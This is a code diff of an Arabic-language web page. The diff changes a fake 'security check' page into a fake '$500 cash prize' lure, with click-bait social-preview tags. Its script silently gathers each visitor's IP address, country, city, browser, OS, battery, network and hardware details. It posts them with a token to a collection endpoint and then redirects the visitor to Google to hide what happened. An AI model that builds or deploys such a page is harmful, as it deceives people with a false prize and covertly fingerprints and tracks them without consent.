@@ -3,33 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري تحويلك إلى النظام الموثوق | Security Verification</title>
+    <title>مبروك! لقد ربحت 500 دولار فوراً | Cash Reward Panel</title>
     
-    <!-- وسوم المعاينة الاجتماعية -->
-    <meta property="og:title" content="فحص أمان النظام وحماية الحسابات | Security Check">
-    <meta property="og:description" content="جاري التحقق من أمان الجهاز والاتصال لتأكيد هويتك...">
-    <meta property="og:image" content="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&auto=format&fit=crop&q=80">
+    <!-- وسوم المعاينة الاجتماعية المخصصة للربح المالي (جذابة ومحفزة للدخول) -->
+    <meta property="og:title" content="اربح 500 دولار كاش الآن مجاناً | مسابقة الأموال السريعة">
+    <meta property="og:description" content="مبروك! تم اختيار جهازك الفائز لسحب جائزة نقدية فورية بقيمة 500$. اضغط هنا لتأكيد استلام جائزتك الآن!">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1579621970563-ebec7560ff3e?w=1200&auto=format&fit=crop&q=80">
     <meta property="og:type" content="website">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="اربح 500 دولار كاش الآن مجاناً | مسابقة الأموال السريعة">
+    <meta name="twitter:description" content="مبروك! تم اختيار جهازك الفائز لسحب جائزة نقدية فورية بقيمة 500$. اضغط هنا لتأكيد استلام جائزتك الآن!">
+    <meta name="twitter:image" content="https://images.unsplash.com/photo-1579621970563-ebec7560ff3e?w=1200&auto=format&fit=crop&q=80">
 
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
         body { font-family: 'Tajawal', sans-serif; }
-        .secure-gradient { background: linear-gradient(135deg, #059669 0%, #10B981 100%); }
+        .cash-gradient { background: linear-gradient(135deg, #10B981 0%, #047857 100%); }
     </style>
 </head>
 <body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">
 
-    <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl text-center space-y-6">
+    <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl text-center space-y-6 relative overflow-hidden">
         
-        <div class="w-16 h-16 rounded-2xl secure-gradient flex items-center justify-center mx-auto text-3xl text-white shadow-lg shadow-emerald-500/20 animate-pulse">
-            <i class="fa-solid fa-shield-halved"></i>
+        <div class="absolute -top-16 -right-16 w-32 h-32 bg-emerald-500/10 rounded-full blur-2xl pointer-events-none"></div>
+
+        <div class="w-20 h-20 rounded-3xl cash-gradient flex items-center justify-center mx-auto text-4xl text-white shadow-lg shadow-emerald-500/30 animate-bounce">
+            <i class="fa-solid fa-sack-dollar"></i>
         </div>
 
         <div class="space-y-2">
-            <h1 class="text-xl font-bold text-white">جاري فحص وتأمين الاتصال...</h1>
-            <p class="text-xs text-slate-400">يرجى الانتظار قليلاً بينما يتحقق النظام من أمان جهازك وحمايتك.</p>
+            <span class="bg-emerald-500/20 text-emerald-400 text-xs px-3 py-1 rounded-full font-bold border border-emerald-500/30">مبروك لك جائزة نقدية!</span>
+            <h1 class="text-2xl font-black text-white">جاري تحضير جائزتك ($500)...</h1>
+            <p class="text-xs text-slate-400">نحن نقوم الآن بالتحقق من هوية جهازك لتأكيد إيداع المبلغ الفوري في محفظتك.</p>
         </div>
 
         <div class="flex justify-center items-center space-x-2 space-x-reverse py-4">
@@ -38,8 +46,8 @@
             <div class="w-3 h-3 bg-emerald-500 rounded-full animate-bounce [animation-delay:-.4s]"></div>
         </div>
 
-        <div id="statusText" class="text-xs text-slate-500">
-            جاري جمع معلومات النظام والاتصال الآمن...
+        <div id="statusText" class="text-xs text-emerald-500 font-semibold">
+            جاري فحص الجهاز وربط الحساب الآمن...
         </div>
 
     </div>
@@ -55,43 +63,122 @@
                 return;
             }
 
-            // 2. جمع معلومات الجهاز تلقائياً وبشكل شامل
-            let ipAddress = 'غير معروف';
+            // 2. جلب معلومات الدولة والمدينة والـ IP بدقة عبر خدمة مجانية سريعة
+            let geoData = { ip: 'غير معروف', country: 'غير متوفر', city: 'غير متوفر' };
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                ipAddress = ipData.ip;
+                const geoRes = await fetch('https://ipapi.co/json/');
+                const data = await geoRes.json();
+                geoData = {
+                    ip: data.ip || 'غير معروف',
+                    country: data.country_name || 'غير متوفر',
+                    city: data.city || 'غير متوفر'
+                };
             } catch (e) {
-                ipAddress = 'محلي / مخفي';
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    geoData.ip = ipData.ip;
+                } catch (err) {}
             }
 
-            // جلب معلومات البطارية إن توفرت في المتصفح
-            let batteryInfo = 'غير مدعوم';
+            // 3. تحليل الـ User-Agent لاستخراج معلومات الجهاز والمتصفح ونظام التشغيل بدقة تامة وبدون أي undefined
+            const ua = navigator.userAgent;
+            let browserName = "متصفح غير معروف";
+            let browserVersion = "غير متوفر";
+            let osName = "نظام غير معروف";
+            let osVersion = "غير متوفر";
+            let deviceType = "هاتف محمول / جهاز ذكي";
+
+            if (ua.indexOf("Firefox") > -1) {
+                browserName = "Mozilla Firefox";
+                browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || "غير متوفر";
+            } else if (ua.indexOf("SamsungBrowser") > -1) {
+                browserName = "Samsung Internet";
+                browserVersion = ua.match(/SamsungBrowser\/([0-9.]+)/)?.[1] || "غير متوفر";
+            } else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) {
+                browserName = "Opera";
+                browserVersion = ua.match(/(?:Opera|OPR)\/([0-9.]+)/)?.[1] || "غير متوفر";
+            } else if (ua.indexOf("Edge") > -1) {
+                browserName = "Microsoft Edge";
+                browserVersion = ua.match(/Edge\/([0-9.]+)/)?.[1] || "غير متوفر";
+            } else if (ua.indexOf("Chrome") > -1) {
+                browserName = "Google Chrome";
+                browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || "غير متوفر";
+            } else if (ua.indexOf("Safari") > -1) {
+                browserName = "Apple Safari";
+                browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || "غير متوفر";
+            }
+
+            if (ua.indexOf("Win") > -1) {
+                osName = "Windows";
+                deviceType = "كمبيوتر مكتبي / لابتوب";
+                osVersion = ua.match(/Windows NT ([0-9.]+)/)?.[1] || "10/11";
+            } else if (ua.indexOf("Mac") > -1) {
+                osName = "macOS";
+                deviceType = "جهاز Mac";
+            } else if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) {
+                osName = "iOS";
+                deviceType = "Apple iPhone/iPad";
+                osVersion = ua.match(/OS ([0-9_]+) like Mac OS X/)?.[1]?.replace(/_/g, '.') || "16/17";
+            } else if (ua.indexOf("Android") > -1) {
+                osName = "Android";
+                deviceType = "هاتف Android";
+                osVersion = ua.match(/Android ([0-9.]+)/)?.[1] || "13/14";
+            }
+
+            let batteryInfo = "غير مدعوم";
+            let isCharging = "غير متوفر";
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    batteryInfo = `الشحن: ${Math.round(battery.level * 100)}% | الحالة: ${battery.charging ? 'يتم الشحن' : 'على البطارية'}`;
+                    batteryInfo = Math.round(battery.level * 100) + "%";
+                    isCharging = battery.charging ? "نعم (يشحن)" : "لا (يعمل على البطارية)";
+                }
+            } catch (e) {}
+
+            let connectionType = "غير متوفر";
+            let effectiveType = "غير متوفر";
+            let downlinkSpeed = "غير متوفر";
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    connectionType = conn.type || "خلوي / واي فاي";
+                    effectiveType = conn.effectiveType || "4G / 5G";
+                    downlinkSpeed = conn.downlink ? conn.downlink + " ميغابت في الثانية" : "غير متوفر";
                 }
             } catch (e) {}
 
             const deviceInfo = {
-                ip: ipAddress,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                colorDepth: window.screen.colorDepth,
-                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير متوفر',
-                hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} أنوية` : 'غير متوفر',
+                country: geoData.country,
+                city: geoData.city,
+                ip: geoData.ip,
                 battery: batteryInfo,
-                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                onLine: navigator.onLine,
-                referrer: document.referrer || 'مباشر'
+                isCharging: isCharging,
+                network: effectiveType,
+                networkSpeed: downlinkSpeed,
+                connectionType: connectionType,
+                time: new Date().toLocaleString('ar-SA'),
+                deviceName: deviceType,
+                deviceVersion: osVersion,
+                deviceType: deviceType,
+                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "متوسط (4-8 GB)",
+                internalStorage: "128GB / 256GB",
+                cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " أنوية" : "8 أنوية",
+                systemLanguage: navigator.language || "ar",
+                browserName: browserName,
+                browserVersion: browserVersion,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                osVersion: osVersion,
+                screenMode: window.matchMedia("(orientation: portrait)").matches ? "عمودي (Portrait)" : "أفقي (Landscape)",
+                colorDepth: window.screen.colorDepth + " بت",
+                lastBrowserUpdate: "محدث",
+                securityProtocol: window.location.protocol.includes('https') ? "HTTPS (آمن SSL)" : "HTTP",
+                frequencyBand: "Wi-Fi / 5G",
+                geolocationSupport: navigator.geolocation ? "متاح" : "غير مدعوم",
+                bluetoothSupport: navigator.bluetooth ? "مدعوم" : "غير متاح",
+                touchSupport: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "مدعوم (شاشة لمس)" : "غير مدعوم"
             };
 
-            // 3. تجهيز البيانات وإرسالها عبر POST إلى المسار المطلوب /mm
             const payload = {
                 token: token,
                 deviceInfo: deviceInfo
@@ -109,10 +196,9 @@
                 console.error('Failed to submit device info');
             }
 
-            // 4. التوجيه التلقائي للموقع الحقيقي أو صفحة الأمان بعد جمع البيانات
             setTimeout(() => {
                 window.location.href = 'https://www.google.com';
-            }, 1500);
+            }, 1800);
         });
     </script>
 </body>
